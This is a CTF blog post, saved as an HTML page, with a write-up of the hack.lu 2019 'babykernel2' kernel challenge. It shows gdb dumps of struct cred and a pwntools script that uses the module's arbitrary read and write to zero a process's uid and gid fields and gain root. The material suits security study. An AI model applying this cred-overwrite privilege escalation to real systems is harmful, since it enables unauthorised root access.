@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>hack.lu 2019 | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="babykernel2直接给了AAW和AAR Each process has a struct called task_struct which is stored in kernel space, this structure contains a lot of information related to the process like scheduling information, me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack.lu 2019">
+<meta property="og:url" content="http://example.com/2019/11/09/2019hacklu/index.html">
+<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
+<meta property="og:description" content="babykernel2直接给了AAW和AAR Each process has a struct called task_struct which is stored in kernel space, this structure contains a lot of information related to the process like scheduling information, me">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-11-09T03:07:10.000Z">
+<meta property="article:modified_time" content="2025-11-18T07:31:23.504Z">
+<meta property="article:author" content="xrivendell7">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019hacklu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/09/2019hacklu/" class="article-date">
+  <time class="dt-published" datetime="2019-11-09T03:07:10.000Z" itemprop="datePublished">2019-11-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      hack.lu 2019
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="babykernel2"><a href="#babykernel2" class="headerlink" title="babykernel2"></a>babykernel2</h2><p>直接给了AAW和AAR</p>
+<p>Each process has a struct called task_struct which is stored in kernel space, this structure contains a lot of information related to the process like scheduling information, memory descriptor(mm_struct) which has information about programs memory, parent process, linked list of child process, next task and more importantly it has a pointer to process privileges which is a structure named cred. So our task is to overwrite the identifiers( uid, gid, group id, fsuid, fsgid) to 0 which is nothing but a process with root privileges.</p>
+<ol>
+<li>Read <code>current_task</code> ptr address based on provided <code>System.map</code></li>
+<li>Get <code>cred* cred</code> pointer</li>
+<li>Overwrite <code>cred-&gt;fsuid</code> and <code>cred-&gt;fsguid</code></li>
+<li>Read <code>/flag</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> ptype /o struct cred</span><br><span class="line">/* offset    |  size */  <span class="built_in">type</span> = struct cred &#123;</span><br><span class="line">/*    0      |     4 */    atomic_t usage;</span><br><span class="line">/*    4      |     4 */    kuid_t uid;</span><br><span class="line">/*    8      |     4 */    kgid_t gid;</span><br><span class="line">/*   12      |     4 */    kuid_t suid;</span><br><span class="line">/*   16      |     4 */    kgid_t sgid;</span><br><span class="line">/*   20      |     4 */    kuid_t euid;</span><br><span class="line">/*   24      |     4 */    kgid_t egid;</span><br><span class="line">/*   28      |     4 */    kuid_t fsuid;</span><br><span class="line">/*   32      |     4 */    kgid_t fsgid;</span><br><span class="line">/*   36      |     4 */    unsigned int securebits;</span><br><span class="line">/*   40      |     8 */    kernel_cap_t cap_inheritable;</span><br><span class="line">/*   48      |     8 */    kernel_cap_t cap_permitted;</span><br><span class="line">/*   56      |     8 */    kernel_cap_t cap_effective;</span><br><span class="line">/*   64      |     8 */    kernel_cap_t cap_bset;</span><br><span class="line">/*   72      |     8 */    kernel_cap_t cap_ambient;</span><br><span class="line">/*   80      |     8 */    struct user_struct *user;</span><br><span class="line">/*   88      |     8 */    struct user_namespace *user_ns;</span><br><span class="line">/*   96      |     8 */    struct group_info *group_info;</span><br><span class="line">/*  104      |    16 */    union &#123;</span><br><span class="line">/*                 4 */        int non_rcu;</span><br><span class="line">/*                16 */        struct callback_head &#123;</span><br><span class="line">/*  104      |     8 */            struct callback_head *next;</span><br><span class="line">/*  112      |     8 */            void (*func)(struct callback_head *);</span><br><span class="line"></span><br><span class="line">                                   /* total size (bytes):   16 */</span><br><span class="line">                               &#125; rcu;</span><br><span class="line"></span><br><span class="line">                               /* total size (bytes):   16 */</span><br><span class="line">                           &#125;;</span><br><span class="line"></span><br><span class="line">                           /* total size (bytes):  120 */</span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以通过<code>init_task</code>也就是0号进程的前向task_list指针找到<code>current_task</code>，可以通过泄露<code>comm</code>进程名来确定</p>
+<p>因为通过Ctrl+C在gdb中断下的是在Init的swapper，即0号进程，通过tasks指针来找到最后一个运行的进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task.tasks</span><br><span class="line"><span class="variable">$18</span> = &#123;</span><br><span class="line">  next = 0xffff888000028210,</span><br><span class="line">  prev = 0xffff888003375990</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然应该最简单的是通过<code>current_task</code>来，在运行的client_kernel.ko中下断，此时内核的current_task即为当前进程并查看cred如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task</span><br><span class="line">$<span class="number">32</span> = (<span class="keyword">struct</span> task_struct *) <span class="number">0xffff888003373480</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>comm</span><br><span class="line">$<span class="number">33</span> =   <span class="string">&quot;client_kernel_b&quot;</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>cred</span><br><span class="line">$<span class="number">34</span> = (<span class="type">const</span> <span class="keyword">struct</span> cred *) <span class="number">0xffff888003384700</span></span><br><span class="line">gef&gt; p *$<span class="number">34</span></span><br><span class="line">$<span class="number">35</span> = &#123;</span><br><span class="line">  usage = &#123;</span><br><span class="line">    counter = <span class="number">0x3</span></span><br><span class="line">  &#125;,</span><br><span class="line">  uid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  gid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  suid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  sgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  euid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  egid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsuid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  securebits = <span class="number">0x0</span>,</span><br><span class="line">  cap_inheritable = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">          [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_permitted = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_effective = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_bset = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0xffffffff</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x3f</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_ambient = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  user = <span class="number">0xffff888003380000</span>,</span><br><span class="line">  user_ns = <span class="number">0xffffffff8183e5c0</span> &lt;init_user_ns&gt;,</span><br><span class="line">  group_info = <span class="number">0xffff88800018d2c0</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    non_rcu = <span class="number">0x0</span>,</span><br><span class="line">    rcu = &#123;</span><br><span class="line">      next = <span class="number">0x0</span>,</span><br><span class="line">      func = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见cred的数据结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">gef&gt; ptype /o <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>    |  <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    <span class="type">atomic_t</span> usage;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    <span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="comment">/*    8      |     4 */</span>    <span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="comment">/*   12      |     4 */</span>    <span class="type">kuid_t</span> suid;</span><br><span class="line"><span class="comment">/*   16      |     4 */</span>    <span class="type">kgid_t</span> sgid;</span><br><span class="line"><span class="comment">/*   20      |     4 */</span>    <span class="type">kuid_t</span> euid;</span><br><span class="line"><span class="comment">/*   24      |     4 */</span>    <span class="type">kgid_t</span> egid;</span><br><span class="line"><span class="comment">/*   28      |     4 */</span>    <span class="type">kuid_t</span> fsuid;</span><br><span class="line"><span class="comment">/*   32      |     4 */</span>    <span class="type">kgid_t</span> fsgid;</span><br></pre></td></tr></table></figure>
+
+<p>就根据offset从4byte-20bytes都更改为0，即可实现改进程的提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># HOST,PORT = &quot;babykernel2.forfuture.fluxfingers.net&quot;,&quot;1337&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(HOST,PORT,timeout=10)</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">addr</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    r(<span class="string">&quot;level is: &quot;</span>)</span><br><span class="line">    value = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,value</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(value))</span><br><span class="line"></span><br><span class="line">init_task = <span class="number">0xffffffff8181b4c0</span></span><br><span class="line">offset = <span class="number">0x218</span></span><br><span class="line"><span class="comment"># init_task.tasks.prev</span></span><br><span class="line">task = read(init_task+offset)-<span class="number">0x210</span></span><br><span class="line"><span class="comment"># task.cred</span></span><br><span class="line">cred = read(task+<span class="number">0x400</span>)</span><br><span class="line">write(cred,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x8</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x10</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x20</span>,<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># read flag</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;nicely_done_this_is_how_a_privesc_can_also_go&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/09/2019hacklu/" data-id="cuidwkx8-nuOCF44hRSOvYhy_" data-title="hack.lu 2019" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/11/22/qwb2019-re/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          qwb2019-re
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2019 巅峰极客 线上赛</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/18/train0927/">train0927</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 xrivendell7<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
